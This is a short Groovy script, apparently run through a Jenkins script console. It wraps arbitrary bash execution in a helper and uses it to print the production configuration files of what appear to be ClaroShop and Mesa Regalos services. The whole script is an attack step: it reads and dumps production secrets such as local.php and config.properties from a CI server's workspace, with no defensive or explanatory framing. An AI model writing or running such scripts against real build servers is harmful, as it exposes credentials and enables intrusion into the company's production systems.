// MICRO-AF: Read ClaroShop/Produccion/local.php + Mesa Regalos PROD + config.properties
def run = { cmd ->
    def p = ["bash", "-c", cmd].execute()
    def out = new StringBuffer()
    def err = new StringBuffer()
    p.consumeProcessOutput(out, err)
    p.waitForOrKill(20000)
    out.toString().take(6000)
}

println "=== ClaroShop/Produccion/local.php ==="
def prod = run("cat '/var/jenkins_home/workspace/_trash/name_it/ClaroShop/Produccion/local.php' 2>/dev/null")
println prod.take(5000)

println "\n=== API-MesaRegalos/Produccion/autoload/local.php (FIRST 200 lines) ==="
def mr = run("cat '/var/jenkins_home/workspace/_trash/name_it/API-MesaRegalos/Produccion/autoload/local.php' 2>/dev/null")
println mr.take(3000)

println "\n=== API-MesaRegalos-java/PROD/config.properties ==="
def javaConf = run("cat '/var/jenkins_home/workspace/_trash/name_it/API-MesaRegalos-java/PROD/config.properties' 2>/dev/null")
println javaConf.take(2000)

println "\n=== DONE MICRO-AF ==="
